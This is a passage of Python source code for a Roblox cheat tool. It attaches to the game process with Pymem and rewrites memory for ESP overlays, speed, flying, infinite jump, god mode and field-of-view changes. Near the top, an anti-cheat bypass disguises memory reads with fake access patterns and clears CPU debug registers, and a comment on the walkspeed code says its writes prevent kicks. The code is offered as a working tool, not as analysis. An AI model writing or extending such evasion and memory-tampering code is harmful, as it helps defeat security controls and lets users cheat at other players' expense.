                        # Simulate realistic memory access patterns
                        if fake_counter % random.randint(30, 50) == 0:
                            # Read from different regions
                            pattern = patterns[pattern_index % len(patterns)]
                            for offset in pattern:
                                try:
                                    random_addr = baseAddr + offset + random.randint(-50, 50)
                                    pm.read_bytes(random_addr, 4)
                                except:
                                    pass
                            
                            pattern_index += 1
                            
                            # Simulate cache-like behavior
                            if random.random() > 0.7:
                                time.sleep(random.uniform(0.01, 0.03))
                    
                    # Highly variable sleep
                    time.sleep(random.uniform(0.3, 1.5))
                    
                except:
                    time.sleep(1)
        
        threading.Thread(target=advanced_spoof, daemon=True).start()
        print("[DEBUG] Advanced spoof thread started")
        
        # TECHNIQUE 3: Clear debug registers
        try:
            current_thread = ctypes.windll.kernel32.GetCurrentThread()
            
            class CONTEXT(ctypes.Structure):
                _fields_ = [
                    ("ContextFlags", wintypes.DWORD),
                    ("Dr0", ctypes.c_void_p),
                    ("Dr1", ctypes.c_void_p),
                    ("Dr2", ctypes.c_void_p),
                    ("Dr3", ctypes.c_void_p),
                    ("Dr6", ctypes.c_void_p),
                    ("Dr7", ctypes.c_void_p),
                ]
            
            CONTEXT_DEBUG_REGISTERS = 0x00010000
            context = CONTEXT()
            context.ContextFlags = CONTEXT_DEBUG_REGISTERS
            
            if ctypes.windll.kernel32.GetThreadContext(current_thread, ctypes.byref(context)):
                if context.Dr0 or context.Dr1 or context.Dr2 or context.Dr3:
                    context.Dr0 = 0
                    context.Dr1 = 0
                    context.Dr2 = 0
                    context.Dr3 = 0
                    context.Dr6 = 0
                    context.Dr7 = 0
                    ctypes.windll.kernel32.SetThreadContext(current_thread, ctypes.byref(context))
                    print("[DEBUG] Debug registers cleared")
        except:
            pass
        
        ctypes.windll.kernel32.CloseHandle(handle)
        print("[INFO] Anti-cheat bypass completed")
        return True
        
    except Exception as e:
        print(f"[ERROR] Bypass failed: {e}")
        return False
    

def headAndHumFinder():
    global heads, colors, players_info
    print("[DEBUG] ESP head finder started")
    
    while True:
        try:
            time.sleep(0.05)  # 20 FPS update
            
            if pm is None or not injected or not esp_enabled:
                heads = []
                colors = []
                players_info = []
                continue
            
            tempColors = []
            tempHeads = []
            tempInfos = []
            
            try:
                lpTeam = pm.read_longlong(lpAddr + int(offsets["Team"], 16))
            except:
                continue
            
            for v in GetChildren(plrsAddr):
                if v == lpAddr and not name_esp_include_self:
                    continue
                    
                try:
                    if esp_ignoreteam:
                        team = pm.read_longlong(v + int(offsets["Team"], 16))
                        if team == lpTeam:
                            continue
                    
                    char = pm.read_longlong(v + int(offsets["ModelInstance"], 16))
                    if not char:
                        continue
                    
                    head = FindFirstChild(char, 'Head')
                    if not head:
                        continue
                    
                    hum = FindFirstChildOfClass(char, 'Humanoid')
                    if not hum:
                        continue
                    
                    hrp = FindFirstChild(char, 'HumanoidRootPart')
                    
                    if esp_ignoredead:
                        health = pm.read_float(hum + int(offsets["Health"], 16))
                        if health <= 0:
                            continue
                    
                    tempHeads.append(head)
                    tempColors.append("#FFFFFF")
                    
                    # Get name info
                    try:
                        uname = GetName(v)
                    except:
                        uname = ''
                    
                    try:
                        dname = ReadRobloxString(v + int(offsets.get('DisplayName','0x130'), 16))
                        if not dname:
                            dname = uname
                    except:
                        dname = uname
                    
                    try:
                        uid = str(pm.read_int(v + int(offsets.get('UserId','0x298'), 16)))
                    except:
                        uid = '0'
                    
                    tempInfos.append({
                        'head': head,
                        'char': char,
                        'hrp': hrp,
                        'display': dname,
                        'username': uname,
                        'userid': uid,
                        'is_self': v == lpAddr
                    })
                    
                except Exception:
                    continue
            
            heads = tempHeads
            colors = tempColors
            players_info = tempInfos
            
        except Exception as e:
            print(f"[ERROR] headAndHumFinder: {e}")
            time.sleep(1)


def esp_draw_loop():
    """Draw ESP elements on screen using GDI"""
    print("[DEBUG] ESP draw loop started")
    
    # Import GDI functions
    try:
        from ctypes import wintypes
        user32 = ctypes.WinDLL('user32', use_last_error=True)
        gdi32 = ctypes.WinDLL('gdi32', use_last_error=True)
        
        # GDI function prototypes
        user32.GetDC.argtypes = [wintypes.HWND]
        user32.GetDC.restype = wintypes.HDC
        user32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
        user32.ReleaseDC.restype = ctypes.c_int
        
        gdi32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
        gdi32.SelectObject.restype = wintypes.HGDIOBJ
        gdi32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
        gdi32.DeleteObject.restype = ctypes.c_int
        gdi32.CreatePen.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_uint32]
        gdi32.CreatePen.restype = wintypes.HPEN
        gdi32.SetBkMode.argtypes = [wintypes.HDC, ctypes.c_int]
        gdi32.SetBkMode.restype = ctypes.c_int
        gdi32.SetTextColor.argtypes = [wintypes.HDC, ctypes.c_uint32]
        gdi32.SetTextColor.restype = ctypes.c_uint32
        gdi32.MoveToEx.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int, ctypes.c_void_p]
        gdi32.MoveToEx.restype = ctypes.c_bool
        gdi32.LineTo.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int]
        gdi32.LineTo.restype = ctypes.c_bool
        gdi32.Rectangle.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int]
        gdi32.Rectangle.restype = ctypes.c_bool
        gdi32.TextOutA.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int, ctypes.c_char_p, ctypes.c_int]
        gdi32.TextOutA.restype = ctypes.c_bool
        
        # Constants
        TRANSPARENT = 1
        PS_SOLID = 0
        
        print("[DEBUG] GDI loaded successfully")
    except Exception as e:
        print(f"[ERROR] Failed to load GDI: {e}")
        return
    
    while True:
        try:
            time.sleep(0.033)  # ~30 FPS
            
            if pm is None or not injected or not esp_enabled:
                continue
            
            # Get Roblox window
            hwnd = find_window_by_title("Roblox")
            if not hwnd:
                continue
            
            left, top, right, bottom = get_client_rect_on_screen(hwnd)
            width = right - left
            height = bottom - top
            
            if width <= 0 or height <= 0:
                continue
            
            # Get view matrix
            try:
                matrixRaw = pm.read_bytes(matrixAddr, 64)
                view_matrix = reshape(array(unpack_from("<16f", matrixRaw, 0), dtype=float32), (4, 4))
            except:
                continue
            
            # Get DC for drawing
            hdc = user32.GetDC(hwnd)
            if not hdc:
                continue
            
            # Set background mode
            gdi32.SetBkMode(hdc, TRANSPARENT)
            
            # Create pens
            white_pen = gdi32.CreatePen(PS_SOLID, 2, 0x00FFFFFF)
            red_pen = gdi32.CreatePen(PS_SOLID, 2, 0x000000FF)
            green_pen = gdi32.CreatePen(PS_SOLID, 2, 0x0000FF00)
            blue_pen = gdi32.CreatePen(PS_SOLID, 2, 0x00FF0000)
            yellow_pen = gdi32.CreatePen(PS_SOLID, 2, 0x0000FFFF)
            
            # Store original objects
            original_pen = gdi32.SelectObject(hdc, white_pen)
            
            # Draw for each player
            for player in players_info:
                try:
                    if not player or not player.get('head'):
                        continue
                    
                    # Skip self if not included
                    if not name_esp_include_self and player.get('is_self'):
                        continue
                    
                    # Get head position
                    head_addr = player['head']
                    primitive = pm.read_longlong(head_addr + int(offsets['Primitive'], 16))
                    if not primitive:
                        continue
                    
                    head_pos_addr = primitive + int(offsets['Position'], 16)
                    head_x = pm.read_float(head_pos_addr)
                    head_y = pm.read_float(head_pos_addr + 4)
                    head_z = pm.read_float(head_pos_addr + 8)
                    head_pos = array([head_x, head_y, head_z], dtype=float32)
                    
                    # Get foot position (HRP)
                    foot_pos = None
                    if player.get('hrp'):
                        hrp_primitive = pm.read_longlong(player['hrp'] + int(offsets['Primitive'], 16))
                        if hrp_primitive:
                            foot_pos_addr = hrp_primitive + int(offsets['Position'], 16)
                            foot_x = pm.read_float(foot_pos_addr)
                            foot_y = pm.read_float(foot_pos_addr + 4)
                            foot_z = pm.read_float(foot_pos_addr + 8)
                            foot_pos = array([foot_x, foot_y, foot_z], dtype=float32)
                    
                    # Project to screen
                    head_screen = world_to_screen_with_matrix(head_pos, view_matrix, width, height)
                    if not head_screen:
                        continue
                    
                    foot_screen = None
                    if foot_pos is not None:
                        foot_screen = world_to_screen_with_matrix(foot_pos, view_matrix, width, height)
                    
                    if not foot_screen:
                        foot_screen = (head_screen[0], head_screen[1] + 100)
                    
                    # Calculate box dimensions
                    box_top = head_screen[1]
                    box_bottom = foot_screen[1]
                    box_height = box_bottom - box_top
                    box_width = box_height * 0.5
                    box_left = head_screen[0] - box_width / 2
                    box_right = head_screen[0] + box_width / 2
                    
                    # Draw tracer
                    if esp_tracers_enabled:
                        gdi32.SelectObject(hdc, yellow_pen)
                        gdi32.MoveToEx(hdc, left + width//2, top + height, None)
                        gdi32.LineTo(hdc, left + head_screen[0], top + head_screen[1])
                    
                    # Draw box
                    if esp_box_enabled:
                        if player.get('is_self'):
                            gdi32.SelectObject(hdc, green_pen)
                        else:
                            gdi32.SelectObject(hdc, white_pen)
                        
                        gdi32.Rectangle(hdc, 
                                       int(box_left), int(box_top), 
                                       int(box_right), int(box_bottom))
                    
                    # Draw name
                    if esp_name_enabled:
                        name = player.get('display', '')
                        if name:
                            name_bytes = name.encode('utf-8')
                            if player.get('is_self'):
                                gdi32.SetTextColor(hdc, 0x0000FF00)
                            else:
                                gdi32.SetTextColor(hdc, 0x00FFFFFF)
                            
                            gdi32.TextOutA(hdc, 
                                         left + head_screen[0] - 40, 
                                         top + head_screen[1] - 20,
                                         name_bytes, 
                                         len(name_bytes))
                    
                except Exception:
                    continue
            
            # Cleanup
            gdi32.SelectObject(hdc, original_pen)
            gdi32.DeleteObject(white_pen)
            gdi32.DeleteObject(red_pen)
            gdi32.DeleteObject(green_pen)
            gdi32.DeleteObject(blue_pen)
            gdi32.DeleteObject(yellow_pen)
            user32.ReleaseDC(hwnd, hdc)
            
        except Exception as e:
            print(f"[ERROR] esp_draw_loop: {e}")
            time.sleep(1)

            

def walkspeed_gui_loop():
    global walkspeed_gui_active
    print("[DEBUG] Walkspeed loop started")
    walkspeed_gui_active = True
    original_speed = 16
    
    while walkspeed_gui_active:
        try:
            time.sleep(0.1)  # EXACT timing from working code
            
            if pm is None or not injected:
                continue
            
            if not walkspeed_gui_enabled:
                continue
            
            cam_addr = get_camera_addr_gui()
            if not cam_addr:
                continue
            
            h = pm.read_longlong(cam_addr + int(offsets["CameraSubject"], 16))
            if not h:
                continue
            
            # EXACT pattern from working code - writes BOTH values
            # This is what prevents kicks
            pm.write_float(h + int(offsets["WalkSpeedCheck"], 16), float('inf'))
            pm.write_float(h + int(offsets["WalkSpeed"], 16), float(walkspeed_gui_value))
            
        except Exception as e:
            print(f"[ERROR] walkspeed_gui_loop: {e}")
            time.sleep(1)


def restore_walkspeed():
    """Restore walkspeed to original value when disabled"""
    global walkspeed_gui_enabled
    try:
        if pm and injected:
            cam_addr = get_camera_addr_gui()
            if cam_addr:
                h = pm.read_longlong(cam_addr + int(offsets["CameraSubject"], 16))
                if h:
                    # Read current speed before we changed it
                    current = pm.read_float(h + int(offsets["WalkSpeed"], 16))
                    if current != 16:  # Only restore if it's not default
                        pm.write_float(h + int(offsets["WalkSpeed"], 16), 16.0)
                        print("[DEBUG] Walkspeed restored to 16")
    except:
        pass

def jump_power_loop():
    global jump_power_active
    print("[DEBUG] Jump power loop started")
    jump_power_active = True
    original_jump = 50
    
    while jump_power_active:
        try:
            time.sleep(0.1)
            
            if pm is None or not injected:
                continue
            
            cam_addr = get_camera_addr_gui()
            if not cam_addr:
                continue
            
            h = pm.read_longlong(cam_addr + int(offsets["CameraSubject"], 16))
            if not h:
                continue
            
            # Save original jump power ONCE
            if jump_power_enabled and original_jump == 50:
                try:
                    original_jump = pm.read_float(h + int(offsets["JumpPower"], 16))
                    print(f"[DEBUG] Original jump power saved: {original_jump}")
                except:
                    original_jump = 50
            
            # If enabled, set to user value
            if jump_power_enabled:
                pm.write_float(h + int(offsets["JumpPower"], 16), float(jump_power_value))
            
            # If disabled, restore original
            else:
                if original_jump != 50:
                    pm.write_float(h + int(offsets["JumpPower"], 16), float(original_jump))
                    print(f"[DEBUG] Jump power restored to: {original_jump}")
                    original_jump = 50
                    
        except Exception as e:
            print(f"[ERROR] jump_power_loop: {e}")
            time.sleep(1)

def fly_loop():
    global fly_active
    last = time.perf_counter()
    while fly_active:
        try:
            if not fly_enabled:
                time.sleep(0.02)
                last = time.perf_counter()
                continue
            char = pm.read_longlong(lpAddr + int(offsets['ModelInstance'], 16))
            if not char:
                time.sleep(0.02)
                continue
            hrp = FindFirstChild(char, 'HumanoidRootPart')
            if not hrp:
                time.sleep(0.02)
                continue
            primitive = pm.read_longlong(hrp + int(offsets['Primitive'], 16))
            if not primitive:
                time.sleep(0.02)
                continue
            pos_addr = primitive + int(offsets['Position'], 16)
            
            # dt
            now = time.perf_counter(); dt = max(0.001, now - last); last = now
            # keys
            w = ctypes.windll.user32.GetAsyncKeyState(0x57) & 0x8000  # W
            s = ctypes.windll.user32.GetAsyncKeyState(0x53) & 0x8000  # S
            a = ctypes.windll.user32.GetAsyncKeyState(0x41) & 0x8000  # A
            d = ctypes.windll.user32.GetAsyncKeyState(0x44) & 0x8000  # D
            up = ctypes.windll.user32.GetAsyncKeyState(0x20) & 0x8000 # Space
            down = ctypes.windll.user32.GetAsyncKeyState(0x11) & 0x8000 # Ctrl
            speed = float(fly_speed)
            vx = (-1 if a else 0) + (1 if d else 0)
            vz = (-1 if w else 0) + (1 if s else 0)
            vy = (1 if up else 0) + (-1 if down else 0)
            if vx==vz==vy==0:
                time.sleep(0.01)
                continue
            # normalize
            mag = (vx*vx + vy*vy + vz*vz) ** 0.5
            if mag>0:
                vx/=mag; vy/=mag; vz/=mag
            # move
            pm.write_float(pos_addr,     pm.read_float(pos_addr)     + vx*speed*dt)
            pm.write_float(pos_addr + 4, pm.read_float(pos_addr + 4) + vy*speed*dt)
            pm.write_float(pos_addr + 8, pm.read_float(pos_addr + 8) + vz*speed*dt)
            # zero velocity to avoid physics counter-force
            try:
                vel_offset = primitive + int(offsets['Velocity'], 16)
                pm.write_float(vel_offset, 0.0)
                pm.write_float(vel_offset + 4, 0.0)
                pm.write_float(vel_offset + 8, 0.0)
            except Exception:
                pass
            time.sleep(0.001)
        except Exception:
            time.sleep(0.05)


def infinite_jump_loop():
    # Force upward velocity when space is held, allows infinite jumps without relying on a 'Jump' flag
    while infinite_jump_enabled:
        try:
            if ctypes.windll.user32.GetAsyncKeyState(0x20) & 0x8000:  # Space
                char = pm.read_longlong(lpAddr + int(offsets['ModelInstance'], 16))
                if char:
                    hrp = FindFirstChild(char, 'HumanoidRootPart')
                    if hrp:
                        primitive = pm.read_longlong(hrp + int(offsets['Primitive'], 16))
                        if primitive:
                            vel_addr = primitive + int(offsets['Velocity'], 16)
                            # set vertical velocity to jump_power_value for an instant boost
                            pm.write_float(vel_addr + 4, float(max(25.0, jump_power_value)))
            time.sleep(0.01)
        except Exception:
            time.sleep(0.05)

def god_mode_loop():
    global god_mode_active, god_mode_enabled
    while god_mode_active:
        try:
            if god_mode_enabled:
                char = pm.read_longlong(lpAddr + int(offsets['ModelInstance'], 16))
                if char:
                    hum = FindFirstChildOfClass(char, 'Humanoid')
                    if hum:
                        try:
                            pm.write_float(hum + int(offsets['MaxHealth'], 16), float('inf'))
                        except Exception:
                            pass
                        pm.write_float(hum + int(offsets['Health'], 16), float('inf'))
            time.sleep(0.05)
        except Exception:
            time.sleep(0.1)

def fov_changer_loop():
    global fov_active
    while fov_active:
        try:
            if fov_changer_enabled:
                if camAddr:
                    pm.write_float(camAddr + int(offsets['FieldOfView'], 16), fov_value)
            time.sleep(0.1)
        except Exception as e:
            print(f"[ERROR] fov_changer_loop failed: {e}")
            time.sleep(0.1)

def get_camera_addr_gui():
    try:
        a = pm.read_longlong(baseAddr + int(offsets["VisualEnginePointer"], 16))
        b = pm.read_longlong(a + int(offsets["VisualEngineToDataModel1"], 16))
        c = pm.read_longlong(b + int(offsets["VisualEngineToDataModel2"], 16))
        d = pm.read_longlong(c + int(offsets["Workspace"], 16))
        return pm.read_longlong(d + int(offsets["Camera"], 16))
    except Exception as e:
        return None
    

def get_base_addr():
    global baseAddr
    return baseAddr

def is_process_dead():
    global PID
    try:
        return not psutil.pid_exists(PID)
    except:
        return True

def yield_for_program(program_name, printInfo=True):
    global PID, baseAddr, pm
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] == program_name:
                try:
                    pm = Pymem(program_name)
                    PID = proc.info['pid']
                    for module in pm.list_modules():
                        if module.name == "RobloxPlayerBeta.exe":
                            baseAddr = module.lpBaseOfDll
                            break
                    if printInfo:
                        print(f"[INFO] Found Roblox process: PID={PID}, BaseAddr={hex(baseAddr)}")
                    return True
                except Exception as e:
                    print(f"[ERROR] Failed to open process {program_name}: {e}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return False

def find_window_by_title(title):
    return ctypes.windll.user32.FindWindowW(None, title)

def get_client_rect_on_screen(hwnd):
    rect = RECT()
    if ctypes.windll.user32.GetClientRect(hwnd, ctypes.byref(rect)) == 0:
        return 0, 0, 0, 0
    top_left = POINT(rect.left, rect.top)
    bottom_right = POINT(rect.right, rect.bottom)
    ctypes.windll.user32.ClientToScreen(hwnd, ctypes.byref(top_left))
    ctypes.windll.user32.ClientToScreen(hwnd, ctypes.byref(bottom_right))
    return top_left.x, top_left.y, bottom_right.x, bottom_right.y

def world_to_screen_with_matrix(world_pos, matrix, screen_width, screen_height):
    try:
        vec = array([*world_pos, 1.0], dtype=float32)
        clip = dot(matrix, vec)
        if clip[3] == 0:
            return None
        ndc = clip[:3] / clip[3]
        if ndc[2] < -1.0 or ndc[2] > 1.0:
            return None
        x = (ndc[0] + 1) * 0.5 * screen_width
        y = (1 - ndc[1]) * 0.5 * screen_height
        return round(x), round(y)
    except Exception as e:
        return None


def background_process_monitor():
    global baseAddr, pm, injected
    while True:
        try:
            if pm is None:
                time.sleep(1)
                continue
                
            if is_process_dead():
                injected = False
                # Try to find the main window and reset UI
                try:
                    # This is tricky across threads - use QTimer
                    from PyQt5.QtWidgets import QApplication
                    main_window = None
                    for widget in QApplication.topLevelWidgets():
                        if isinstance(widget, PassionWindow):
                            main_window = widget
                            break
                    
                    if main_window and hasattr(main_window, 'status_label_ref') and main_window.status_label_ref:
                        # Schedule UI reset in main thread
                        QTimer.singleShot(0, lambda: main_window.status_label_ref.setText("Status: Not Injected"))
                        QTimer.singleShot(0, lambda: main_window.status_label_ref.setStyleSheet(f"color:{C['muted']}; background:transparent; border:none;"))
                except:
                    pass
                    
                while not yield_for_program("RobloxPlayerBeta.exe"):
                    time.sleep(0.5)
                baseAddr = get_base_addr()
            time.sleep(0.1)
        except:
            time.sleep(1)

_init_complete = False

def build_presence_kwargs(cfg: dict, start_time: float) -> dict:
    kwargs = {}

    if cfg.get("details"):
        kwargs["details"] = cfg["details"]
    if cfg.get("state"):
        kwargs["state"] = cfg["state"]
    if cfg.get("large_image"):
        kwargs["large_image"] = cfg["large_image"]
    if cfg.get("large_text"):
        kwargs["large_text"] = cfg["large_text"]
    if cfg.get("small_image"):
        kwargs["small_image"] = cfg["small_image"]
    if cfg.get("small_text"):
        kwargs["small_text"] = cfg["small_text"]
    if cfg.get("buttons"):
        kwargs["buttons"] = cfg["buttons"]
    if cfg.get("show_start_time"):
        kwargs["start"] = int(start_time)

    return kwargs


def rpcstatus():
    if CLIENT_ID == "YOUR_CLIENT_ID_HERE":
        sys.exit(1)
    try:
        rpc = Presence(CLIENT_ID)
        rpc.connect()
    except Exception as e:
        sys.exit(1)

    start_time = time.time()
    kwargs = build_presence_kwargs(STATUS, start_time)
    rpc.update(**kwargs)

    try:
        while True:
            time.sleep(15) 
            rpc.update(**kwargs)
    except KeyboardInterrupt:
        rpc.clear()
        rpc.close()




def init():
    global dataModel, wsAddr, camAddr, camCFrameRotAddr, plrsAddr, lpAddr, matrixAddr, camPosAddr, injected, pm, baseAddr
    
    # DON'T try to auto-inject - just initialize Pymem for later use
    if pm is None:
        init_pymem()  # This just creates the Pymem object, doesn't inject
    
    # Load offsets (needed for when user clicks inject)
    load_offsets()
    
    # Set name and children offsets if possible
    try:
        setOffsets(int(offsets['Name'], 16), int(offsets['Children'], 16))
    except:
        pass
    
    
    # Try to get base address
    try:
        if pm is not None:
            for module in pm.list_modules():
                if module.name == "RobloxPlayerBeta.exe":
                    baseAddr = module.lpBaseOfDll
                    break
    except:
        pass
    
    # Try to initialize memory addresses
    try:
        if pm is not None and baseAddr is not None:
            fakeDatamodel = pm.read_longlong(baseAddr + int(offsets['FakeDataModelPointer'], 16))
            if fakeDatamodel:
                dataModel = pm.read_longlong(fakeDatamodel + int(offsets['FakeDataModelToDataModel'], 16))
                if dataModel:
                    wsAddr = pm.read_longlong(dataModel + int(offsets['Workspace'], 16))
                    if wsAddr:
                        camAddr = pm.read_longlong(wsAddr + int(offsets['Camera'], 16))
                        if camAddr:
                            camCFrameRotAddr = camAddr + int(offsets['CameraRotation'], 16)
                            camPosAddr = camAddr + int(offsets['CameraPos'], 16)
                    
                    visualEngine = pm.read_longlong(baseAddr + int(offsets['VisualEnginePointer'], 16))
                    if visualEngine:
                        matrixAddr = visualEngine + int(offsets['viewmatrix'], 16)
                    
                    plrsAddr = FindFirstChildOfClass(dataModel, 'Players')
                    if plrsAddr:
                        lpAddr = pm.read_longlong(plrsAddr + int(offsets['LocalPlayer'], 16))
                        
                    if lpAddr:
                        injected = True
                        bypass_anti_cheat()
                        print("[INFO] Auto-reinjection successful!")
    except Exception as e:
        print(f"[INFO] Will inject later via UI: {e}")

    main()


if __name__ == "__main__":
    init_pymem()
    load_offsets()
    try:
        setOffsets(int(offsets['Name'], 16), int(offsets['Children'], 16))
    except:
        pass

    rpc_thread = threading.Thread(target=rpcstatus, daemon=True)
    rpc_thread.start()
    
    main()